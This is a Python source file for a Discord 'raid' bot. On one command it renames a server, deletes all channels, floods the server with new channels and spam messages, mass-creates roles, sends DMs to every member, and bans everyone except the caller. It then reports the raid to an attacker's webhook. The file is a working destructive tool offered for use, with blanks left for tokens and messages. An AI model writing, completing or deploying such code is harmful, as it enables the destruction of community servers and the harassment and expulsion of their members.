import asyncio
import discord
from time import sleep
from discord.ext import commands
from discord_webhook import DiscordWebhook, DiscordEmbed

intents = discord.Intents.default()
intents.members = True
client = commands.Bot(command_prefix="k!", intents=intents)
hook = "" #Put your webhook to get reports of raids over here

@client.event
async def on_ready():
    print("Encendido y listo.")
    #Here you can change the status of the bot adding elements to the list
    status = [
      "test status 1",
      "test status 2"
    ]
    while True:
        for bot_status in status:
            await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=bot_status))
            await asyncio.sleep(60)

@client.event 
async def on_guild_channel_create(channel):
    counter = 0
    while counter < 50: #Number of messages per channel created
        await channel.send("") #Put a message here
        counter += 1
        asyncio.sleep(1)

async def channels(ctx):
    await ctx.guild.edit(name="") #New name for the entire server
    for guild in client.guilds:
        for channel in guild.channels:
            try:
                await channel.delete()
            except:
                pass
        counter = 0
        while counter < 100:
            await ctx.guild.create_text_channel("") #Channel's name
            counter += 1
            
async def roles(ctx):
    counter = 0
    while counter < 50:
        try:
            await ctx.create_role(name="") #Role's name
        except:
            pass
        counter += 1

async def dm(ctx):
    for users in client.get_all_members():
        if users != ctx.message.author:
            try:
                await users.send("") #Also DM Messages
            except:
                pass

async def ban_users(ctx):
    for members in client.get_all_members():
        if members != ctx.message.author:
            try:
                await members.ban()
            except:
                pass

async def report_webhook(ctx, webh):
    webhook = DiscordWebhook(url=webh)
    embed = DiscordEmbed(title="Nuevo Raid Reportado.", color=0xe01e00)
    embed.add_embed_field(name="Información del Raid:", value=f"Raid by: {ctx.message.author}\nServer: {ctx.guild.name}\nPeople in the server: {ctx.guild.member_count}")
    embed.set_image(url="") #Image for Embed message
    embed.set_footer(text="Raidbot by: r2pc96")
    webhook.add_embed(embed)
    webhook.execute()

@client.command()
async def sayonara(ctx):
    await report_webhook(ctx, webh=hook)
    await channels(ctx)
    await roles(ctx)
    await dm(ctx)
    await ban_users(ctx)

client.run("") #Discord bot token
